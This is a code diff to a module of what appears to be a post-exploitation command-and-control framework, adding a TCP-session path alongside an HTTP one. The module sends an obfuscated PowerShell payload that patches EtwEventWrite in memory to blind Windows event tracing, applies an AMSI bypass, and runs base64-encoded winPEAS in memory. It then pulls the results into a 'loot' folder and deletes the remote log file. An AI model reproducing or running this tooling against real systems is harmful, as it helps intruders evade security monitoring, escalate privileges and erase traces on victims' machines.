@@ -52,33 +52,118 @@ class Module(ModuleBase):
 
         etw = "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Win{[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string s);[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p);[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }';$k=([char[]](107,101,114,110,101,108,51,50,46,100,108,108)-join'');$n=([char[]](110,116,100,108,108,46,100,108,108)-join'');$v=([char[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)-join'');$e=([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101)-join'');$mod=[Win]::LoadLibrary($k);$vp=[Win]::GetProcAddress($mod,$v);$ntbase=([System.Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName -eq $n}).BaseAddress;$peOff=$ntbase.ToInt64()+0x3C;$pe=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$peOff);$etblOff=$ntbase.ToInt64()+$pe+0x88;$expt=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$etblOff);$exptVA=$ntbase.ToInt64()+$expt;$fnCount=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x18));$fnNamesRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x20));$fnNamesVA=$ntbase.ToInt64()+$fnNamesRVA;$etwptr=0;for($i=0;$i-lt$fnCount;$i++){$nameRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($fnNamesVA+($i*4)));$namePtr=($ntbase.ToInt64()+$nameRVA);$currName=\"\";for($j=0;($c=[System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($namePtr),$j))-ne 0;$j++){$currName+=[char]$c};if($currName-eq$e){$etwptr=$namePtr;break}};$etwAddr=[IntPtr]$etwptr;$null=[Win]::VirtualProtect($etwAddr,[UIntPtr]::op_Explicit(1),0x40,[ref]([uint32]0));[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,0xC3);"
 
-        shell.run_command_http(sid, amsi)
-        shell.run_command_http(sid, etw)
-        print(brightgreen + "[+] AMSI and ETW bypassed.")
+        if session_manager.is_tcp_session(sid):
+            shell.run_quiet_tcpcmd(sid, amsi)
+            shell.run_quiet_tcpcmd(sid, etw)
+            print(brightgreen + "[+] AMSI and ETW bypassed.")
 
-        print(brightyellow + "[*] Running winPEAS in-memory and saving output to file...")
+            print(brightyellow + "[*] Running winPEAS in-memory and saving output to file...")
 
-        remote_log = "C:\\Windows\\Temp\\wp_check.txt"
-        ps = (
-            f"$code=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\"{b64_peas}\"));"
-            "$sb=[ScriptBlock]::Create($code);"
-            f"& $sb | Out-String | Out-File -FilePath \"{remote_log}\" -Encoding ASCII"
-        )
+            remote_log = "C:\\Windows\\Temp\\wp_check.txt"
+            ps = (
+                f"$code=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\"{b64_peas}\"));"
+                "$sb=[ScriptBlock]::Create($code);"
+                f"& $sb | Out-String | Out-File -FilePath \"{remote_log}\" -Encoding ASCII"
+            )
+
+            shell.run_quiet_tcpcmd(sid, ps)
+            print(brightyellow + "[*] Downloading output...")
+            local_outfile = f"./loot/{sid}_winpeas.txt"
+            shell.download_file_tcp(sid, remote_log, local_outfile)
+
+            clean_log = f"del {remote_log}"
+            shell.run_quiet_tcpcmd(sid, clean_log)
+            output_display = 0
+
+            while True:
+                try:
+                    output = input(brightyellow + f"[*] Would you like to display the winpeas results to the screen y/N? ")
+
+                    if output in ("y", "Y", "yes", "Yes", "yess", "Yess"):
+                        output_display = 1
+                        break
+
+                    elif output in ("n", "N", "no", "No", "noo", "Noo"):
+                        output_display = 0
+                        break
+
+                    else:
+                        print(brightred + f"[-] ERROR you picked an invalid option!")
+
+                except Exception as e:
+                    print(brightred + f"[-] ERROR failed to capture input from user: {e}")
+
+                if output_display == 1:
+                    print(brightgreen + f"[+] winPEAS output saved to {local_outfile}")
+                    print(brightblue + "\n=== winPEAS Output ===\n")
+                    with open(local_outfile, "r") as f:
+                        file = f.read()
+
+                    print(file)
+
+                elif output_display == 0:
+                    pass
+
+                else:
+                    print(brightred + f"[-] ERROR an unknown error has ocurred!")
+
+        elif session_manager.sessions[sid].transport in ("http", "https"):
+            shell.run_command_http(sid, amsi)
+            shell.run_command_http(sid, etw)
+            print(brightgreen + "[+] AMSI and ETW bypassed.")
+
+            print(brightyellow + "[*] Running winPEAS in-memory and saving output to file...")
+
+            remote_log = "C:\\Windows\\Temp\\wp_check.txt"
+            ps = (
+                f"$code=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\"{b64_peas}\"));"
+                "$sb=[ScriptBlock]::Create($code);"
+                f"& $sb | Out-String | Out-File -FilePath \"{remote_log}\" -Encoding ASCII"
+            )
 
 
-        shell.run_command_http(sid, ps)
-        print(brightyellow + "[*] Downloading output...")
+            shell.run_command_http(sid, ps)
+            print(brightyellow + "[*] Downloading output...")
 
-        local_outfile = f"./loot/{sid}_winpeas.txt"
-        shell.download_file_http(sid, remote_log, local_outfile)
+            local_outfile = f"./loot/{sid}_winpeas.txt"
+            shell.download_file_http(sid, remote_log, local_outfile)
+            print(brightgreen + f"[+] Downloaded winpeas output to {local_outfile}")
 
-        clean_log = f"del {remote_log}"
-        shell.run_command_http(sid, clean_log)
+            clean_log = f"del {remote_log}"
+            shell.run_command_http(sid, clean_log)
+            output_display = 0
 
-        print(brightgreen + f"[+] winPEAS output saved to {local_outfile}")
-        print(brightblue + "\n=== winPEAS Output ===\n")
-        with open(local_outfile, "r") as f:
-            file = f.read()
+            while True:
+                try:
+                    output = input(brightyellow + f"[*] Would you like to display the winpeas results to the screen y/N? ")
 
-        print(file)
-        #print(output or brightred + "[!] No output received. Output may be too large or blocked.")
+                    if output in ("y", "Y", "yes", "Yes", "yess", "Yess"):
+                        output_display = 1
+                        break
+
+                    elif output in ("n", "N", "no", "No", "noo", "Noo"):
+                        output_display = 0
+                        break
+
+                    else:
+                        print(brightred + f"[-] ERROR you picked an invalid option!")
+
+                except Exception as e:
+                    print(brightred + f"[-] ERROR failed to capture input from user: {e}")
+
+            if output_display == 1:
+                print(brightgreen + f"[+] winPEAS output saved to {local_outfile}")
+                print(brightblue + "\n=== winPEAS Output ===\n")
+                with open(local_outfile, "r") as f:
+                    file = f.read()
+
+                print(file)
+
+            elif output_display == 0:
+                pass
+
+            else:
+                print(brightred + f"[-] ERROR an unknown error has ocurred!")
+
+
+
